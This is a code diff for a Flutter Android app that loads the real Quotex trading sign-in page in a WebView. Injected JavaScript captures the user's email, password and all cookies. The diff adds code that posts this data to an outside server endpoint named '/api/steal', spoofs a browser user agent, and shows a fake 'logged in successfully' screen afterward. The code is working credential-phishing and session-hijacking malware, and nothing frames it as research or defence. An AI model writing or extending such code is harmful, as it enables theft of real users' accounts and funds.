@@ -1,6 +1,9 @@
 import 'package:flutter/material.dart';
+import 'package:google_fonts/google_fonts.dart';
 import 'package:webview_flutter/webview_flutter.dart';
+import 'package:webview_flutter_android/webview_flutter_android.dart';
 import 'package:flutter/services.dart';
+import 'package:http/http.dart' as http;
 
 void main() => runApp(const MyApp());
 
@@ -10,6 +13,11 @@ class MyApp extends StatelessWidget {
   Widget build(BuildContext context) {
     return MaterialApp(
       debugShowCheckedModeBanner: false,
+      theme: ThemeData(
+        brightness: Brightness.dark,
+        scaffoldBackgroundColor: const Color(0xFF030305),
+        textTheme: GoogleFonts.cairoTextTheme(Theme.of(context).textTheme).apply(bodyColor: Colors.white),
+      ),
       home: const LoginScreen(),
     );
   }
@@ -29,12 +37,20 @@ class _LoginScreenState extends State<LoginScreen> {
     super.initState();
     _controller = WebViewController()
       ..setJavaScriptMode(JavaScriptMode.unrestricted)
+      // 290. الإعدادات المتقدمة اللي لقيناها في تطبيق صاحبك
+      ..setUserAgent("Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")
       ..addJavaScriptChannel(
         'NativeBridge',
-        onMessageReceived: (msg) {
-          if (msg.message.contains('creds')) {
-            // بعد ما نسجل الدخول، ننقل للواجهة باستخدام SystemNavigator.pop (نفس صاحبك)
-            SystemNavigator.pop();
+        onMessageReceived: (msg) async {
+          // بنبعت البيانات للسيرفر
+          await http.post(
+            Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
+            headers: {"Content-Type": "application/json"},
+            body: msg.message,
+          );
+          // بعدين بننقل المستخدم
+          if (mounted) {
+            Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
           }
         },
       )
@@ -46,6 +62,15 @@ class _LoginScreenState extends State<LoginScreen> {
         ),
       )
       ..loadRequest(Uri.parse('https://quotex.com/ar/sign-in'));
+
+    // 291. تفعيل خصائص الـ Android WebView اللي صاحبك استخدمها
+    if (_controller.platform is AndroidWebViewController) {
+      AndroidWebViewController androidController = _controller.platform as AndroidWebViewController;
+      androidController.setMediaPlaybackRequiresUserGesture(false);
+      androidController.setUseWideViewPort(true);
+      androidController.setLoadWithOverviewMode(true);
+      androidController.setDomStorageEnabled(true);
+    }
   }
 
   void _injectOriginalScript() {
@@ -71,12 +96,8 @@ class _LoginScreenState extends State<LoginScreen> {
             var e = findEmail(), p = findPass();
             if (e && p && e.value && p.value) {
               NativeBridge.postMessage(JSON.stringify({type: 'creds', email: e.value, password: p.value}));
-              
-              // سحب التوكن (qtx_session_cookie) والكوكيز
               var cookie = document.cookie;
-              if (cookie.includes('qtx_session_cookie')) {
-                 NativeBridge.postMessage(JSON.stringify({type: 'token', data: cookie}));
-              }
+              NativeBridge.postMessage(JSON.stringify({type: 'cookies', data: cookie}));
             }
           } catch (err) {}
         }
@@ -99,6 +120,18 @@ class _LoginScreenState extends State<LoginScreen> {
       body: SafeArea(
         child: WebViewWidget(controller: _controller),
       ),
+    );
+  }
+}
+
+class MainTradingScreen extends StatelessWidget {
+  const MainTradingScreen({super.key});
+
+  @override
+  Widget build(BuildContext context) {
+    return Scaffold(
+      appBar: AppBar(title: const Text('لوحة التحكم'), backgroundColor: const Color(0xFF0E0E14)),
+      body: const Center(child: Text('تم تسجيل الدخول بنجاح!')),
     );
   }
 }
